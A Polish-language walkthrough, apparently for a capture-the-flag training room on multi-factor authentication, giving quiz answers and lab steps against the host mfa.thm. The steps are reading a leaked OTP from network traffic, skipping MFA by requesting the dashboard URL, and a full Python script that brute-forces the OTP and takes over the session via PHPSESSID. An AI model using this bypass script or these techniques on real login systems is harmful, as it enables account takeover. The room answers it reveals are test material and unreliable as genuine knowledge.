# Multi-Factor-Authentication

Witam, ten pokój będzie bardzo prosty, ponieważ ma jedynie 1 ćwiczenia praktyczne a reszta to teoria, zachęcam do zapozna się z teorią we własnym zakresie ponieważ byłoby to głupie kopiowanie wszystko tutaj.

1.Jak działa MFA

Task 1:Podczas logowania do aplikacji otrzymujesz SMS na swój telefon zawierający OTP. Jaki jest to czynnik uwierzytelniania?

```Może to być Twój telefon z aplikacją uwierzytelniającą, tokenem bezpieczeństwa, a nawet kartą inteligentną. Ostatnio obserwujemy częstsze stosowanie certyfikatów klienckich, które są jak cyfrowe karty identyfikacyjne dla urządzeń.``` - odpowiedźią będzie: Something you have

2.Implementacje i Aplikacje

Task 1: Czy uwierzytelnianie wieloskładnikowe jest ważnym czynnikiem chroniącym naszą aktywność online i offline przed zagrożeniami? (tak/nie)
```Uwierzytelnianie wieloskładnikowe ( MFA ) jest obecnie ważnym czynnikiem chroniącym nasze działania online i offline przed podmiotami stanowiącymi zagrożenie. Od bankowości i opieki zdrowotnej po korporacyjne IT, te branże w dużym stopniu polegają na MFA w celu zabezpieczenia danych przed atakującymi``` - odpowiedźią będzie: yea

3.Typowe luki w zabezpieczeniach MFA

Task 1:Co można zrobić, aby zapobiec atakom siłowym na hasła jednorazowe?
```Bez odpowiedniego ograniczenia szybkości aplikacja jest otwarta na ataki, aby bez problemu próbować różnych OTP. Jeśli atakujący może przesłać wiele prób w krótkim czasie, zwiększa to prawdopodobieństwo, że atakujący będzie w stanie uzyskać prawidłowy OTP.``` - odpowiedźią będzie: rate limiting

4.Ćwiczenie praktyczne - Wyciek OTP

Task 1: Co oznacza flaga na desce rozdzielczej?
Pierwszy krok to przejście na stronę http://mfa.thm/labs/first, następnie odpalennie narzędzi programistycznych (f12), przejście do zakładki networking. Kolejno wpisać adres email, hasło:
```
Nazwa użytkownika	  Hasło
thm@mail.thm	      test123
```

Logujemy się i w przechwyconym ruchu widzimy zakładkę mfa

![image](https://github.com/user-attachments/assets/98837d86-5535-41c1-9193-0e711ac02e2b)

I przechodząc w tą zakładkę uzyskujemy token, logujemy się i otrzymujemy flagę 

![image](https://github.com/user-attachments/assets/a0b6622d-fd9e-4795-b285-c871991266a5)

5.Praktyczne - Niepewne kodowanie

Task 1: Co oznacza flaga na desce rozdzielczej?

W pierwszej kolejności przechodzimy na podaną stronę: http://mfa.thm/labs/second/ 
```
Nazwa użytkownika	  Hasło
thm@mail.thm	      test123
```
Dane logowania możesz znaleźc powyżej.
Kod tej aplikacji jest popsut, możemy bez problemu ominąć podanie tego kodu, przechodząc do dashboard, manipulując adresem URL: ```http://mfa.thm/labs/second/dashboard``` - wyświetli nam się flaga na głównej stronie:

![image](https://github.com/user-attachments/assets/db344f68-5126-4280-9e98-9979946fd972)

6.Praktyczne – Pokonywanie funkcji automatycznego wylogowywania

Task 1:Co oznacza flaga na desce rozdzielczej?

Musimy użyć tego skryptu aby automatycznie za pomocą brute-force wymusił nam token uwierzytelniania, następnie jeśli próba się powiedzie, otrzymamy ```{'PHPSESSID': '2e7ddn3amfcng2eln0n7ifkhoc'}``` - dzięki temu w narzędzia programistycznych możemy podmienić nasz PHPSESSID i otrzymamy sesję użytkownika, który jest zalogowany.

```
import requests

# Define the URLs for the login, 2FA process, and dashboard
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
dashboard_url = 'http://mfa.thm/labs/third/dashboard'

# Define login credentials
credentials = {
    'email': 'thm@mail.thm',
    'password': 'test123'
}

# Define the headers to mimic a real browser
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://mfa.thm',
    'Connection': 'close',
    'Referer': 'http://mfa.thm/labs/third/mfa',
    'Upgrade-Insecure-Requests': '1'
}

# Function to check if the response contains the login page
def is_login_successful(response):
    return "User Verification" in response.text and response.status_code == 200

# Function to handle the login process
def login(session):
    response = session.post(login_url, data=credentials, headers=headers)
    return response
  
# Function to handle the 2FA process
def submit_otp(session, otp):
    # Split the OTP into individual digits
    otp_data = {
        'code-1': otp[0],
        'code-2': otp[1],
        'code-3': otp[2],
        'code-4': otp[3]
    }
    
    response = session.post(otp_url, data=otp_data, headers=headers, allow_redirects=False)  # Disable auto redirects
    print(f"DEBUG: OTP submission response status code: {response.status_code}")
    
    return response

# Function to check if the response contains the login page
def is_login_page(response):
    return "Sign in to your account" in response.text or "Login" in response.text

# Function to attempt login and submit the hardcoded OTP until success
def try_until_success():
    otp_str = '1337'  # Hardcoded OTP

    while True:  # Keep trying until success
        session = requests.Session()  # Create a new session object for each attempt
        login_response = login(session)  # Log in before each OTP attempt
        
        if is_login_successful(login_response):
            print("Logged in successfully.")
        else:
            print("Failed to log in.")
            continue

        print(f"Trying OTP: {otp_str}")

        response = submit_otp(session, otp_str)

        # Check if the response is the login page (unsuccessful OTP)
        if is_login_page(response):
            print(f"Unsuccessful OTP attempt, redirected to login page. OTP: {otp_str}")
            continue  # Retry login and OTP submission

        # Check if the response is a redirect (status code 302)
        if response.status_code == 302:
            location_header = response.headers.get('Location', '')
            print(f"Session cookies: {session.cookies.get_dict()}")

            # Check if it successfully bypassed 2FA and landed on the dashboard
            if location_header == '/labs/third/dashboard':
                print(f"Successfully bypassed 2FA with OTP: {otp_str}")
                return session.cookies.get_dict()  # Return session cookies after successful bypass
            elif location_header == '/labs/third/':
                print(f"Failed OTP attempt. Redirected to login. OTP: {otp_str}")
            else:
                print(f"Unexpected redirect location: {location_header}. OTP: {otp_str}")
        else:
            print(f"Received status code {response.status_code}. Retrying...")

# Start the attack to try until success
try_until_success()
```
Tak naprawdę to już tyle, jak wspominałem bardzo prosty pokój, mam nadzieje, że zdał Ci się na coś ten walktrought :)
